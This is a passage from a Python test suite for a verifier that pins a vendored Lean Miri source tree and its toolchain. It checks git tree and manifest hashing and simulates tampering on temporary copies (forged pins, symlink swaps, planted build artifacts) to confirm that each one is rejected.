                os.chmod(planted, 0o644)
                self.assertRejected(lambda: V.verify_toolchain(REPO_ROOT, elan_home=elan, environ={}), needle, "skipped `bin/lean --version`")
                planted.unlink()
        self.assertEqual(V.verify_toolchain(REPO_ROOT, elan_home=elan, environ={}).pin_status, "locked-verified")

    @unittest.skipUnless(HAVE_LIVE_TOOLCHAIN, f"elan toolchain {LIVE_TOOLCHAIN_DIR} not installed")
    def test_live_toolchain_pin_dump_and_verify_roundtrip(self) -> None:
        t = V.verify_toolchain(REPO_ROOT, expected_toolchain=REPO_TOOLCHAIN)
        pin_path = self.tmp / "toolchain-pin.json"
        V.write_toolchain_pin(t, pin_path)
        pin = json.loads(pin_path.read_text())
        self.assertEqual(set(pin), {"toolchain", "versions", "files"})
        self.assertTrue({f"lib/lean/{n}" for n in LIBLEANSHARED} <= set(pin["files"]))
        self.assertEqual({rel for rel in pin["files"] if rel.startswith("bin/")}, {f"bin/{p.name}" for p in (LIVE_TOOLCHAIN_DIR / "bin").iterdir()})
        again = V.verify_toolchain(REPO_ROOT, toolchain_pin_json=pin_path)
        self.assertEqual(again.pin_status, "verified")
        self.assertEqual(dict(again.files), pin["files"])

    @unittest.skipUnless(HAVE_LIVE_TOOLCHAIN, f"elan toolchain {LIVE_TOOLCHAIN_DIR} not installed")
    def test_live_cli_json_smoke_all_three_modes(self) -> None:
        def run(*extra: str) -> subprocess.CompletedProcess:
            return subprocess.run(
                [sys.executable, "-B", str(VERIFIER_PATH), "--repo-root", str(REPO_ROOT), "--json", *extra],
                stdin=subprocess.DEVNULL, capture_output=True, text=True, timeout=600, check=False,
            )

        allowed = run("--allow-deinit-patch")
        self.assertEqual(allowed.returncode, 0, allowed.stdout + allowed.stderr)
        summary = json.loads(allowed.stdout)
        self.assertIs(summary["ok"], True)
        self.assertEqual((summary["mode"], summary["deinit_patch_lock"]), ("deinit-patch", "matched"))
        self.assertEqual(summary["patched_files"], ALLOWLIST)
        self.assertEqual((summary["verified_vendor_files"], summary["verified_aux_files"]), (608, 9))
        self.assertEqual(summary["manifest_sha256"], LOCKED_MANIFEST)
        self.assertEqual(summary["verifier"], "scripts/verify_lean_miri_pin.py")
        digests = summary["toolchain"]["sha256"]
        for rel in ("bin/lean", "bin/lake") + tuple(f"lib/lean/{n}" for n in LIBLEANSHARED):
            self.assertRegex(digests[rel], HEX64, rel)
        locked = run("--require-locked-deinit-patch")
        self.assertEqual(locked.returncode, 0, locked.stdout + locked.stderr)
        self.assertEqual(json.loads(locked.stdout)["mode"], "locked-deinit-patch")
        strict = run()
        self.assertEqual(strict.returncode, 1, strict.stdout + strict.stderr)
        failure = json.loads(strict.stdout)
        self.assertEqual((failure["ok"], failure["mode"]), (False, "strict"))
        self.assertTrue(any("strict mode: UPSTREAM_PIN.json declares 10 patched_files entries" in e for e in failure["errors"]))


# ---------------------------------------------------------------------------
# Hash primitives + manifest formula
# ---------------------------------------------------------------------------


class HashPrimitiveTests(TempCase):
    def test_git_blob_and_tree_ids_match_git(self) -> None:
        self.assertEqual(V.git_blob_sha1(b""), "e69de29bb2d1d6434b8b29ae775ad8c2e48c5391")
        self.assertEqual(V.git_blob_sha1(b"hello\n"), "ce013625030ba8dba906f756967f9e9ca394464a")
        self.assertEqual(V.git_tree_sha1({}), "4b825dc642cb6eb9a060e54bf8d69288fbee4904")
        # Ordering trap: a directory `a` sorts as `a/`, i.e. after `a-c` and
        # `a.b` but before `a0`; plus a 100755 entry.
        files = {"a/x.lean": b"x\n", "a.b": b"dot\n", "a-c": b"dash\n", "a0": b"zero\n", "run.sh": b"#!/bin/sh\n"}
        entries = {rel: ("100755" if rel == "run.sh" else "100644", V.git_blob_sha1(data)) for rel, data in files.items()}
        ours = V.git_tree_sha1(entries)
        self.assertEqual(CT._git_tree_id(entries), ours)  # the check_trusted.py copy agrees
        # The same tree hashed with plain name order (directory `a` sorting
        # first) must differ, so the `name + "/"` rule is actually exercised.
        sub = V.git_tree_sha1({"x.lean": entries["a/x.lean"]})
        top = [("a", "40000", sub)] + [(rel, mode, blob) for rel, (mode, blob) in entries.items() if "/" not in rel]
        naive_body = b"".join(f"{m} {n}".encode() + b"\0" + bytes.fromhex(h) for n, m, h in sorted(top))
        self.assertNotEqual(ours, hashlib.sha1(b"tree %d\0" % len(naive_body) + naive_body).hexdigest())
        git = shutil.which("git")
        if git is None:
            self.skipTest("git not installed; hard-coded vectors checked")
        repo = self.tmp / "gitrepo"
        for rel, data in files.items():
            (repo / rel).parent.mkdir(parents=True, exist_ok=True)
            (repo / rel).write_bytes(data)
        os.chmod(repo / "run.sh", 0o755)
        env = _git_env()
        run = lambda *a: subprocess.run([git, *a], cwd=repo, env=env, check=True, capture_output=True, text=True).stdout.strip()  # noqa: E731
        run("init", "-q")
        run("add", "-A")
        self.assertEqual(ours, run("write-tree"))
        self.assertEqual(V.git_tree_sha1({k[2:]: v for k, v in entries.items() if k.startswith("a/")}), run("rev-parse", f"{run('write-tree')}:a"))

    def test_git_tree_canonical_sorting_foo_variants(self) -> None:
        """Git `base_name_compare` sorts directory `foo` as `foo/` (`0x2f`), so
        `foo-a` (`0x2d`) < `foo.lean` (`0x2e`) < `foo/` (`0x2f`) < `foo_a` (`0x5f`)."""
        files = {
            "foo/bar.lean": b"inside foo dir\n",
            "foo-a": b"dash file\n",
            "foo-dir/x.lean": b"dash dir\n",
            "foo.lean": b"dot lean file\n",
            "foo_a": b"underscore file\n",
            "foo_dir/x.lean": b"underscore dir\n",
        }
        entries = {rel: ("100644", V.git_blob_sha1(data)) for rel, data in files.items()}
        ours = V.git_tree_sha1(entries)
        self.assertEqual(CT._git_tree_id(entries), ours)
        # Verify the exact order of top-level entries:
        # foo-a (0x2d), foo-dir/ (0x2d), foo.lean (0x2e), foo/ (0x2f), foo_a (0x5f), foo_dir/ (0x5f).
        expected_order = [
            ("100644", "foo-a", entries["foo-a"][1]),
            ("40000", "foo-dir", V.git_tree_sha1({"x.lean": entries["foo-dir/x.lean"]})),
            ("100644", "foo.lean", entries["foo.lean"][1]),
            ("40000", "foo", V.git_tree_sha1({"bar.lean": entries["foo/bar.lean"]})),
            ("100644", "foo_a", entries["foo_a"][1]),
            ("40000", "foo_dir", V.git_tree_sha1({"x.lean": entries["foo_dir/x.lean"]})),
        ]
        manual_body = b"".join(f"{m} {n}".encode("utf-8") + b"\0" + bytes.fromhex(h) for m, n, h in expected_order)
        self.assertEqual(ours, hashlib.sha1(b"tree %d\0" % len(manual_body) + manual_body).hexdigest())
        # Naive sorting by bare name (putting "foo" before "foo-a" and "foo.lean") must differ.
        naive_body = b"".join(f"{m} {n}".encode("utf-8") + b"\0" + bytes.fromhex(h) for m, n, h in sorted(expected_order, key=lambda x: x[1]))
        self.assertNotEqual(ours, hashlib.sha1(b"tree %d\0" % len(naive_body) + naive_body).hexdigest())
        git = shutil.which("git")
        if git is not None:
            repo = self.tmp / "gitrepo-foo"
            for rel, data in files.items():
                (repo / rel).parent.mkdir(parents=True, exist_ok=True)
                (repo / rel).write_bytes(data)
            env = _git_env()
            run = lambda *a: subprocess.run([git, *a], cwd=repo, env=env, check=True, capture_output=True, text=True).stdout.strip()  # noqa: E731
            run("init", "-q")
            run("add", "-A")
            self.assertEqual(ours, run("write-tree"))

    def test_manifest_formula_reproduces_pinned_digest_and_rejects_alternatives(self) -> None:
        pin = json.loads((REPO_ROOT / V.PIN_RELPATH).read_text())
        files = pin["vendor_tree"]["files"]
        self.assertEqual(V.compute_manifest_sha256(files), LOCKED_MANIFEST)
        self.assertEqual(pin["vendor_tree"]["manifest_sha256"], LOCKED_MANIFEST)
        alternatives = [
            _sha256("".join(f"{e['sha256']}  {e['path']}\n" for e in sorted(files, key=lambda e: e["path"])).encode()),
            _sha256("".join(f"{e['path']}  {e['sha256']}\n" for e in files).encode()),
            _sha256(json.dumps(files, sort_keys=True, separators=(",", ":")).encode()),
            _sha256(json.dumps(files).encode()),
        ]
        self.assertNotIn(LOCKED_MANIFEST, alternatives)
        paths = [e["path"] for e in files]
        self.assertEqual(paths, sorted(paths, key=V.canonical_manifest_key))
        self.assertNotEqual(paths, sorted(paths))  # canonical order is not plain byte order
        self.assertEqual(paths[0], "Miri.lean")

    def test_toolchain_dir_name_and_name_validation(self) -> None:
        self.assertEqual(V.toolchain_dir_name("leanprover/lean4:v4.34.1"), "leanprover--lean4---v4.34.1")
        self.assertIsNone(V.toolchain_name_problem("leanprover/lean4:v4.34.1"))
        self.assertIsNotNone(V.toolchain_name_problem("leanprover/lean4:stable"))
        self.assertIsNotNone(V.toolchain_name_problem("v4.34.1"))
        for bad in ("/abs.lean", "a/../b.lean", "a//b.lean", "./a.lean", "a\\b.lean", "", "a b.lean"):
            self.assertIsNotNone(V.relpath_problem(bad), bad)
        self.assertIsNone(V.relpath_problem("upstream/.pins/miri.commit"))

    def test_records_are_namedtuples_without_dataclasses(self) -> None:
        # `tests/trusted-boundary/test_boundary.py`-style loaders never register the
        # module in sys.modules: `@dataclass` + string annotations would crash there.
        self.assertNotIn("verify_lean_miri_pin", sys.modules)
        tree = ast.parse(VERIFIER_PATH.read_text(encoding="utf-8"))
        self.assertFalse([n for n in ast.walk(tree) if isinstance(n, ast.Name) and n.id == "dataclass"])
        for cls in (V.PatchedFile, V.ClosureVerification, V.VendorVerification, V.ToolchainVerification, V.PinVerificationResult):
            self.assertTrue(issubclass(cls, tuple) and hasattr(cls, "_fields"), cls)


# ---------------------------------------------------------------------------
# Vendor tree tamper tests (on copies)
# ---------------------------------------------------------------------------


class VendorTamperTests(TempCase):
    def test_copy_baseline_passes_with_fake_toolchain(self) -> None:
        ws = self.workspace()
        tc = make_fake_toolchain(self.tmp)
        result = V.verify_all(ws.root, toolchain_dir=tc, allow_deinit_patch=True)
        self.assertEqual((result.vendor.verified_vendor_files, result.vendor.verified_aux_files), (608, 9))
        self.assertEqual(result.vendor.deinit_patch_lock, "matched")
        self.assertEqual(result.toolchain.libleanshared, LIBLEANSHARED)
        self.assertIn("lib/lean/libInit_shared.so", result.toolchain.files)

    def test_upstream_restore_roundtrip_is_strict_clean_and_reapplies_episode1(self) -> None:
        ws = self.upstream_workspace()
        v = V.verify_vendor(ws.root)
        self.assertEqual((v.mode, v.patched_files, v.deinit_patch_lock), ("strict", (), "absent"))
        self.assertEqual(v.git_objects["Miri"], "tree")  # upstream bytes reproduce the locked Miri tree directly
        # Re-applying the live Episode 1 bytes and pin entries yields the locked state.
        for rel in ALLOWLIST:
            ws.path(rel).write_bytes((REPO_ROOT / V.VENDOR_RELPATH / rel).read_bytes())
        shutil.copy2(REPO_ROOT / V.PIN_RELPATH, ws.pin_path)
        self.assertEqual(V.verify_vendor(ws.root, require_locked_deinit_patch=True).deinit_patch_lock, "matched")

    def test_unpatched_lean_byte_tamper_rejected_in_both_modes(self) -> None:
        ws = self.workspace()
        data = bytearray(ws.path(TAMPER_TARGET).read_bytes())
        data[len(data) // 2] ^= 0x01  # same size, one flipped bit
        ws.path(TAMPER_TARGET).write_bytes(bytes(data))
        for allow in (False, True):
            with self.subTest(allow_deinit_patch=allow):
                self.assertRejected(
                    lambda: V.verify_vendor(ws.root, allow_deinit_patch=allow),
                    f"SHA-256 mismatch for {TAMPER_TARGET}",
                    "git tree SHA-1 mismatch for Miri/",
                )

    def test_live_patch_digest_drift_rejected_by_the_lock(self) -> None:
        # An attacker edits an Episode 1 file AND updates its patched_sha256: the
        # self-consistent pin is rejected because the complete overlay is locked.
        ws = self.workspace()
        rel = "Miri/Interpreter/Call.lean"
        ws.path(rel).write_bytes(ws.path(rel).read_bytes() + b"\n-- smuggled edit\n")
        pin = ws.pin()
        ws.patched_entry(pin, rel)["patched_sha256"] = _sha256(ws.path(rel).read_bytes())
        ws.write_pin(pin)
        needle = f"patched_sha256 {_sha256(ws.path(rel).read_bytes())} for {rel!r} != reviewed Episode 1 patched_sha256"
        self.assertRejected(lambda: V.verify_vendor(ws.root, allow_deinit_patch=True), "locked deinit patch (the complete 10-file overlay)", needle)
        self.assertRejected(lambda: V.verify_vendor(ws.root, require_locked_deinit_patch=True), "locked deinit patch (--require-locked-deinit-patch)", needle)
        # Only the explicit API opt-out (synthetic overlays) accepts it.
        self.assertEqual(V.verify_vendor(ws.root, allow_deinit_patch=True, require_locked_deinit_patch=False).deinit_patch_lock, "unlocked")

    def test_live_dropped_patch_entry_rejected(self) -> None:
        ws = self.workspace()
        rel = "Miri/Interpreter/Cast.lean"
        pin = ws.pin()
        pin["patched_files"] = [e for e in pin["patched_files"] if e["path"] != rel]
        ws.write_pin(pin)
        # Undeclared, the patched bytes must equal upstream: they do not.
        self.assertRejected(lambda: V.verify_vendor(ws.root, allow_deinit_patch=True), f"SHA-256 mismatch for {rel}", "git tree SHA-1 mismatch for Miri/")
        self.assertRejected(lambda: V.verify_vendor(ws.root, require_locked_deinit_patch=True), f"missing patched_files entry for {rel!r}")
        pin.pop("patched_files")
        ws.write_pin(pin)
        self.assertRejected(lambda: V.verify_vendor(ws.root, require_locked_deinit_patch=True), "locked deinit patch required but UPSTREAM_PIN.json has no patched_files")

    def test_synthetic_full_ten_file_overlay_needs_explicit_unlock(self) -> None:
        ws = self.upstream_workspace()
        ws.apply_overlay(ALLOWLIST)
        v = V.verify_vendor(ws.root, allow_deinit_patch=True, require_locked_deinit_patch=False)
        self.assertEqual([p.path for p in v.patched_files], ALLOWLIST)
        self.assertEqual((v.verified_vendor_files, v.verified_aux_files), (608, 9))
        self.assertEqual(v.manifest_sha256, LOCKED_MANIFEST)  # manifest keeps describing upstream bytes
        self.assertEqual(v.git_objects["Miri"], "tree")  # recomputed with upstream_git_blob substitution
        self.assertEqual(v.deinit_patch_lock, "unlocked")
        self.assertRejected(lambda: V.verify_vendor(ws.root, allow_deinit_patch=True), "locked deinit patch (the complete 10-file overlay): patched_sha256")
        self.assertRejected(lambda: V.verify_vendor(ws.root, require_locked_deinit_patch=True), "locked deinit patch (--require-locked-deinit-patch): patched_sha256")
        self.assertRejected(
            lambda: V.verify_vendor(ws.root),
            "strict mode: UPSTREAM_PIN.json declares 10 patched_files entries",
            "SHA-256 mismatch for Miri/Interpreter/ExecutionMachine.lean",
        )
        with self.subTest("4-key schema omitting upstream_git_blob falls back to LOCKED_DEINIT_BLOBS"):
            pin = ws.pin()
            for entry in pin["patched_files"]:
                entry.pop("upstream_git_blob", None)
            ws.write_pin(pin)
            v4 = V.verify_vendor(ws.root, allow_deinit_patch=True, require_locked_deinit_patch=False)
            self.assertEqual(len(v4.patched_files), 10)
            self.assertEqual(v4.git_objects["Miri"], "tree")

    def test_patch_subsets_of_allowlist_accepted_with_the_flag_only(self) -> None:
        for rels in (["Miri/Interpreter/Place.lean", "Miri/Interpreter/PlaceMachine.lean"], ["Miri/Interpreter/Call.lean"], ALLOWLIST[1:]):
            with self.subTest(len(rels)):
                ws = self.upstream_workspace(name=f"repo-{len(rels)}")
                ws.apply_overlay(rels)
                v = V.verify_vendor(ws.root, allow_deinit_patch=True)
                self.assertEqual((len(v.patched_files), v.deinit_patch_lock), (len(rels), "subset"))
                self.assertRejected(lambda: V.verify_vendor(ws.root), "strict mode")
                self.assertRejected(lambda: V.verify_vendor(ws.root, require_locked_deinit_patch=True), "locked deinit patch (--require-locked-deinit-patch): missing patched_files entry")

    def test_eleventh_non_allowlisted_patch_rejected(self) -> None:
        ws = self.upstream_workspace()
        ws.apply_overlay(ALLOWLIST + [TAMPER_TARGET])
        self.assertRejected(
            lambda: V.verify_vendor(ws.root, allow_deinit_patch=True, require_locked_deinit_patch=False),
            f"{TAMPER_TARGET!r} is not in the closed 10-file deinit patch allowlist",
            f"SHA-256 mismatch for {TAMPER_TARGET}",
        )

    def test_noop_patch_entry_rejected(self) -> None:
        ws = self.upstream_workspace()
        pin = ws.pin()
        rel = "Miri/Interpreter/Place.lean"
        digest = ws.manifest_entry(pin, rel)["sha256"]
        pin["patched_files"] = [
            {
                "path": rel,
                "upstream_sha256": digest,
                "patched_sha256": digest,
                "patch_reason": "claims a patch but changes nothing",
                "upstream_git_blob": V.git_blob_sha1(ws.path(rel).read_bytes()),
            }
        ]
        ws.write_pin(pin)
        self.assertRejected(lambda: V.verify_vendor(ws.root, allow_deinit_patch=True), "no-op patch for 'Miri/Interpreter/Place.lean'")

    def test_malformed_or_inconsistent_patch_entries_rejected(self) -> None:
        ws = self.upstream_workspace()
        good = ws.apply_overlay(ALLOWLIST)
        rel = good[0]["path"]
        base_pin = ws.pin()

        def mutate(fn: Callable[[List[Dict[str, Any]]], None]) -> None:
            pin = json.loads(json.dumps(base_pin))
            fn(pin["patched_files"])
            ws.write_pin(pin)

        cases: List[Tuple[str, Callable[[List[Dict[str, Any]]], None], str]] = [
            ("missing reason", lambda e: e[0].pop("patch_reason"), "missing key 'patch_reason'"),
            ("blank reason", lambda e: e[0].update(patch_reason="   "), "patch_reason for"),
            ("uppercase digest", lambda e: e[0].update(patched_sha256=e[0]["patched_sha256"].upper()), "patched_sha256 for"),
            ("short git blob", lambda e: e[0].update(upstream_git_blob="abc123"), "upstream_git_blob for"),
            ("unknown key", lambda e: e[0].update(rationale="joshlf spelling"), "unknown key 'rationale'"),
            ("duplicate entry", lambda e: e.append(dict(e[0])), f"duplicate patched_files entry for {rel!r}"),
            ("traversal path", lambda e: e[0].update(path="../" + rel), "path traversal"),
            ("wrong patched digest", lambda e: e[0].update(patched_sha256="0" * 64), f"{rel}: on-disk SHA-256"),
            ("wrong upstream digest", lambda e: e[0].update(upstream_sha256="1" * 64), "must equal upstream_sha256"),
            ("wrong upstream git blob", lambda e: e[0].update(upstream_git_blob="2" * 40), "git tree SHA-1 mismatch for Miri/"),
            ("wrong upstream git blob vs lock", lambda e: e[0].update(upstream_git_blob="2" * 40), "!= locked pre-image blob"),
        ]
        for label, fn, needle in cases:
            with self.subTest(label):
                mutate(fn)
                self.assertRejected(lambda: V.verify_vendor(ws.root, allow_deinit_patch=True, require_locked_deinit_patch=False), needle)
        with self.subTest("declared patched but bytes are upstream"):
            ws.write_pin(base_pin)
            original = ws.path(rel).read_bytes()
            ws.path(rel).write_bytes(original[: original.rindex(b"\n-- anneal test overlay")])
            self.assertRejected(
                lambda: V.verify_vendor(ws.root, allow_deinit_patch=True, require_locked_deinit_patch=False),
                f"{rel}: declared as patched but holds the unpatched upstream bytes",
            )

    def test_file_symlink_attacks_rejected(self) -> None:
        ws = self.workspace()
        with self.subTest("extra symlink alias"):
            os.symlink(TAMPER_TARGET.rsplit("/", 1)[1], ws.path("Miri/ABI/Alias.lean"))
            self.assertRejected(lambda: V.verify_vendor(ws.root, allow_deinit_patch=True), "symlink forbidden (file symlink): Miri/ABI/Alias.lean")
            ws.path("Miri/ABI/Alias.lean").unlink()
        with self.subTest("pinned file replaced by symlink to identical bytes outside the tree"):
            outside = self.tmp / "outside-Size.lean"
            shutil.copy2(ws.path(TAMPER_TARGET), outside)
            ws.path(TAMPER_TARGET).unlink()
            os.symlink(outside, ws.path(TAMPER_TARGET))
            self.assertRejected(
                lambda: V.verify_vendor(ws.root, allow_deinit_patch=True),
                f"symlink forbidden (file symlink): {TAMPER_TARGET}",
                f"missing pinned file: {TAMPER_TARGET}",
            )
        with self.subTest("patched file replaced by symlink to identical patched bytes"):
            rel = "Miri/Interpreter/Place.lean"
            outside = self.tmp / "outside-Place.lean"
            shutil.copy2(ws.path(rel), outside)
            ws.path(rel).unlink()
            os.symlink(outside, ws.path(rel))
            self.assertRejected(lambda: V.verify_vendor(ws.root, allow_deinit_patch=True), f"symlink forbidden (file symlink): {rel}")

    def test_directory_symlink_attacks_rejected(self) -> None:
        ws = self.workspace()
        with self.subTest("pinned directory replaced by symlink to an identical copy"):
            outside = self.tmp / "outside-ABI"
            shutil.move(str(ws.path("Miri/ABI")), str(outside))
            os.symlink(outside, ws.path("Miri/ABI"))
            self.assertRejected(lambda: V.verify_vendor(ws.root, allow_deinit_patch=True), "symlink forbidden (directory symlink): Miri/ABI", "missing pinned file: Miri/ABI/Size.lean")
            ws.path("Miri/ABI").unlink()
            shutil.move(str(outside), str(ws.path("Miri/ABI")))
            V.verify_vendor(ws.root, allow_deinit_patch=True)  # restored copy verifies again
        with self.subTest("extra directory symlink"):
            os.symlink(self.tmp, ws.path("Miri/Evil"))
            self.assertRejected(lambda: V.verify_vendor(ws.root, allow_deinit_patch=True), "symlink forbidden (directory symlink): Miri/Evil")
        with self.subTest("vendor root itself is a symlink"):
            ws.path("Miri/Evil").unlink()
            real = self.tmp / "real-vendor"
            shutil.move(str(ws.vendor), str(real))
            os.symlink(real, ws.vendor)
            self.assertRejected(lambda: V.verify_vendor(ws.root, allow_deinit_patch=True), "lean-miri/vendor/ is a symlink")

    def test_unlisted_lean_injection_rejected(self) -> None:
        ws = self.workspace()
        ws.path("Miri/ABI/Rogue.lean").write_bytes(b"-- rogue\n")
        ws.path("Evil.lean").write_bytes(b"-- rogue root module\n")
        self.assertRejected(
            lambda: V.verify_vendor(ws.root, allow_deinit_patch=True),
            "unlisted .lean file (not in UPSTREAM_PIN.json): Miri/ABI/Rogue.lean",
            "unlisted .lean file (not in UPSTREAM_PIN.json): Evil.lean",
        )

    def test_unlisted_aux_injection_rejected(self) -> None:
        ws = self.workspace()
        ws.path("tools/evil.py").write_bytes(b"print('pwned')\n")
        ws.path("README.md").write_bytes(b"# rogue\n")
        self.assertRejected(
            lambda: V.verify_vendor(ws.root, allow_deinit_patch=True),
            "unlisted auxiliary file (not in UPSTREAM_PIN.json): tools/evil.py",
            "unlisted auxiliary file (not in UPSTREAM_PIN.json): README.md",
        )

    def test_planted_build_artifacts_rejected(self) -> None:
        ws = self.workspace()
        for rel in (
            "Miri/ABI/Size.olean",
            "Miri/ABI/Size.olean.server",
            "Miri/ABI/Size.ilean",
            "Miri/ABI/Size.ir",
            "Miri/ABI/Size.c",
            "Miri/ABI/Size.olean.hash",
            "Miri/ABI/Size.trace",
            "Miri/cache.ltar",
            "Miri/Interpreter/Call.olean",
        ):
            with self.subTest(rel):
                ws.path(rel).write_bytes(b"\x00planted")
                self.assertRejected(lambda: V.verify_vendor(ws.root, allow_deinit_patch=True), f"planted build artifact: {rel}")
                ws.path(rel).unlink()
        with self.subTest(".lake directory"):
            (ws.vendor / ".lake" / "build").mkdir(parents=True)
            (ws.vendor / ".lake" / "build" / "Miri.olean").write_bytes(b"\x00")
            self.assertRejected(lambda: V.verify_vendor(ws.root, allow_deinit_patch=True), "planted build artifact directory: .lake/")

    def test_missing_files_rejected(self) -> None:
        ws = self.workspace()
        ws.path(TAMPER_TARGET).unlink()
        ws.path("LICENSE-MIT").unlink()
        ws.path("Miri/Interpreter/OperandMachine.lean").unlink()
        self.assertRejected(
            lambda: V.verify_vendor(ws.root, allow_deinit_patch=True),
            f"missing pinned file: {TAMPER_TARGET}",
            "missing pinned file: LICENSE-MIT",
            "missing pinned file: Miri/Interpreter/OperandMachine.lean",
        )

    def test_manifest_sha256_mismatch_and_noncanonical_order_rejected(self) -> None:
        ws = self.workspace()
        pristine = ws.pin()
        with self.subTest("bogus manifest_sha256"):
            pin = json.loads(json.dumps(pristine))
            pin["vendor_tree"]["manifest_sha256"] = "0" * 64
            ws.write_pin(pin)
            self.assertRejected(lambda: V.verify_vendor(ws.root, allow_deinit_patch=True), "vendor_tree.manifest_sha256 mismatch", "[identity] vendor_tree.manifest_sha256")
        with self.subTest("reordered entries with recomputed manifest"):
            pin = json.loads(json.dumps(pristine))
            files = pin["vendor_tree"]["files"]
            files[1], files[2] = files[2], files[1]
            pin["vendor_tree"]["manifest_sha256"] = V.compute_manifest_sha256(files)
            ws.write_pin(pin)
            self.assertRejected(
                lambda: V.verify_vendor(ws.root, allow_deinit_patch=True),
                "vendor_tree.files is not in canonical order",
                absent=("vendor_tree.manifest_sha256 mismatch",),
            )

    def test_git_blob_sha1_mismatch_rejected(self) -> None:
        # Aux content and its SHA-256 entry updated consistently, but
        # upstream_git_objects left stale: only the git cross-check catches it.
        ws = self.workspace()
        ws.path("LICENSE-MIT").write_bytes(ws.path("LICENSE-MIT").read_bytes() + b"\nrelicensed\n")
        pin = ws.pin()
        ws.manifest_entry(pin, "LICENSE-MIT")["sha256"] = _sha256(ws.path("LICENSE-MIT").read_bytes())
        ws.write_pin(pin)
        self.assertRejected(lambda: V.verify_vendor(ws.root, allow_deinit_patch=True), "git blob SHA-1 mismatch for LICENSE-MIT", absent=("SHA-256 mismatch for LICENSE-MIT",))

    def test_miri_tree_hash_mismatch_rejected(self) -> None:
        ws = self.workspace()
        ws.path(TAMPER_TARGET).write_bytes(ws.path(TAMPER_TARGET).read_bytes() + b"\n-- tampered\n")
        pin = ws.pin()
        ws.manifest_entry(pin, TAMPER_TARGET)["sha256"] = _sha256(ws.path(TAMPER_TARGET).read_bytes())
        pin["vendor_tree"]["manifest_sha256"] = V.compute_manifest_sha256(pin["vendor_tree"]["files"])
        ws.write_pin(pin)
        errors = self.assertRejected(
            lambda: V.verify_vendor(ws.root, allow_deinit_patch=True, locked_identity=None),
            "git tree SHA-1 mismatch for Miri/",
            absent=(f"SHA-256 mismatch for {TAMPER_TARGET}", "manifest_sha256 mismatch"),
        )
        self.assertEqual(len(errors), 1, errors)

    def test_mode_only_change_caught_by_tree_hash(self) -> None:
        for rel in (TAMPER_TARGET, "Miri/Interpreter/ExecutionCast.lean"):
            with self.subTest(rel):
                ws = Workspace.create(self.tmp, name=f"repo-{rel.rsplit('/', 1)[1]}")
                path = ws.path(rel)
                os.chmod(path, path.stat().st_mode | stat.S_IXUSR)
                errors = self.assertRejected(lambda: V.verify_vendor(ws.root, allow_deinit_patch=True), "git tree SHA-1 mismatch for Miri/")
                self.assertEqual(len(errors), 1, errors)

    def test_forged_self_consistent_pin_rejected_by_locked_identity(self) -> None:
        ws = self.workspace()
        ws.path(TAMPER_TARGET).write_bytes(b"-- forged upstream\n")
        pin = ws.pin()
        ws.manifest_entry(pin, TAMPER_TARGET)["sha256"] = _sha256(b"-- forged upstream\n")
        pin["vendor_tree"]["manifest_sha256"] = V.compute_manifest_sha256(pin["vendor_tree"]["files"])
        entries = {}
        for entry in pin["vendor_tree"]["files"]:
            if entry["path"].startswith("Miri/"):
                rel = entry["path"]
                # The tree describes upstream bytes: patched files contribute their upstream blob.
                blob = V.LOCKED_DEINIT_BLOBS.get(rel) or V.git_blob_sha1(ws.path(rel).read_bytes())
                entries[rel[len("Miri/"):]] = (V.git_mode(ws.path(rel).stat().st_mode), blob)
        pin["upstream_git_objects"]["Miri"] = V.git_tree_sha1(entries)
        ws.write_pin(pin)
        V.verify_vendor(ws.root, allow_deinit_patch=True, locked_identity=None)  # self-consistent forgery passes without the lock
        self.assertRejected(
            lambda: V.verify_vendor(ws.root, allow_deinit_patch=True),
            "[identity] vendor_tree.manifest_sha256",
            "[identity] upstream_git_objects['Miri']",
        )

    def test_build_toolchain_retarget_rejected_by_the_lock_like_check_trusted(self) -> None:
        """A pin whose `build_lean_toolchain` (and `lean-toolchain`) is retargeted at a
        release without compiled-in digests used to pass `verify_vendor` (the CLI only
        warned "digests computed but not pinned"), while `check_trusted.py` rejects it:
        both verifiers now lock the build toolchain."""
        ws = self.workspace()
        pin = ws.pin()
        pin["build_lean_toolchain"] = "leanprover/lean4:v4.35.0"
        ws.write_pin(pin)
        (ws.root / V.LEAN_TOOLCHAIN_RELPATH).write_text("leanprover/lean4:v4.35.0\n", encoding="utf-8")
        V.verify_vendor(ws.root, allow_deinit_patch=True, locked_identity=None)  # only the lock rejects it
        self.assertRejected(
            lambda: V.verify_vendor(ws.root, require_locked_deinit_patch=True),
            "[identity] build_lean_toolchain 'leanprover/lean4:v4.35.0' is not a toolchain with compiled-in release digests",
        )
        with self.assertRaises(CT.Failure) as cm:
            CT.verify_lean_miri_pin(ws.root)
        self.assertIn("build_lean_toolchain 'leanprover/lean4:v4.35.0' != locked 'leanprover/lean4:v4.34.1'", str(cm.exception))

    def test_pin_verifiers_agree_on_policy_mutations(self) -> None:
        """Differential parity: `verify_vendor(require_locked_deinit_patch=True)` and
        `check_trusted.verify_lean_miri_pin` accept the live pin and reject every
        policy mutation below (neither may drift into accepting what the other
        rejects)."""
        ws = self.workspace()
        pristine = ws.pin()

        def verdicts() -> Tuple[bool, bool]:
            try:
                V.verify_vendor(ws.root, require_locked_deinit_patch=True)
                v_ok = True
            except V.PinVerificationError:
                v_ok = False
            try:
                CT.verify_lean_miri_pin(ws.root)
                ct_ok = True
            except CT.Failure:
                ct_ok = False
            return v_ok, ct_ok

        self.assertEqual(verdicts(), (True, True))
        mutations: List[Tuple[str, Callable[[Dict[str, Any]], None]]] = [
            ("build toolchain retarget", lambda p: p.update(build_lean_toolchain="leanprover/lean4:v4.35.0")),
            ("upstream toolchain", lambda p: p.update(upstream_lean_toolchain="leanprover/lean4:v4.34.1")),
            ("commit", lambda p: p.update(commit="0" * 40)),
            ("extra top-level key", lambda p: p.update(extra=1)),
            ("schema_version float", lambda p: p.update(schema_version=2.0)),
            ("notes not a list", lambda p: p.update(notes="x")),
            ("file digest", lambda p: p["vendor_tree"]["files"][7].update(sha256="0" * 64)),
            ("aux digest", lambda p: p["vendor_aux_files"][0].update(sha256="f" * 64)),
            ("file_count", lambda p: p["vendor_tree"].update(file_count=609)),
            ("duplicate aux entry", lambda p: p["vendor_aux_files"].append(dict(p["vendor_aux_files"][0]))),
            ("patched entry dropped", lambda p: p["patched_files"].pop()),
            ("patched entry duplicated", lambda p: p["patched_files"].append(dict(p["patched_files"][0]))),
            ("patched digest", lambda p: p["patched_files"][1].update(patched_sha256="a" * 64)),
            ("patch reason blank", lambda p: p["patched_files"][0].update(patch_reason="  ")),
            ("git object dropped", lambda p: p["upstream_git_objects"].pop("Miri.lean")),
        ]
        for label, mutate in mutations:
